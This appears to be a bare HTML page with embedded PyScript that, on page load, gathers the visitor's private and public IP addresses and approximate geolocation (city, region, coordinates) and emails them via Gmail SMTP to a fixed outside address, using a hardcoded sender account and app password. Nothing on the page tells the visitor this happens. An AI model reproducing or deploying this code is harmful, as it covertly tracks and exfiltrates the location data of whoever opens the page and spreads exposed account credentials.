<html>
  <head>
    <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
    <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
  </head>
  <body>
    <py-script>
      import socket
      import requests
      import smtplib
      from email.mime.text import MIMEText
      from email.mime.multipart import MIMEMultipart

      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect(("8.8.8.8", 80))
      private_ip = s.getsockname()[0]
      s.close()

      try:
          response = requests.get('https://api.ipify.org?format=json')
          public_ip = response.json()['ip']
      except Exception as e:
          public_ip = f"Error: {e}"

      try:
          geo_response = requests.get(f'http://ip-api.com/json/{public_ip}')
          geo_data = geo_response.json()
          latitude = geo_data.get('lat', 'N/A')
          longitude = geo_data.get('lon', 'N/A')
          city = geo_data.get('city', 'N/A')
          region = geo_data.get('regionName', 'N/A')
          country = geo_data.get('country', 'N/A')
      except Exception as e:
          latitude = longitude = city = region = country = f"Error: {e}"

      sender_email = "optemplate4829@gmail.com"
      receiver_email = "ogpoole09@gmail.com"
      password = "wlkk nkgx zkar hwub"
      
      subject = "Your IP Info & Location"
      body = f"""Hereâ€™s your current info:
      
      Private IP: {private_ip}
      Public IP: {public_ip}
      
      Approx Location:
      Country: {country}
      Region: {region}
      City: {city}
      Latitude: {latitude}
      Longitude: {longitude}
      """

      msg = MIMEMultipart()
      msg['From'] = sender_email
      msg['To'] = receiver_email
      msg['Subject'] = subject
      msg.attach(MIMEText(body, 'plain'))

      try:
          with smtplib.SMTP('smtp.gmail.com', 587) as server:
              server.starttls()
              server.login(sender_email, password)
              server.sendmail(sender_email, receiver_email, msg.as_string())
              print("Email sent successfully!")
      except Exception as e:
          print(f"Error: {e}")
    </py-script>
  </body>
</html>
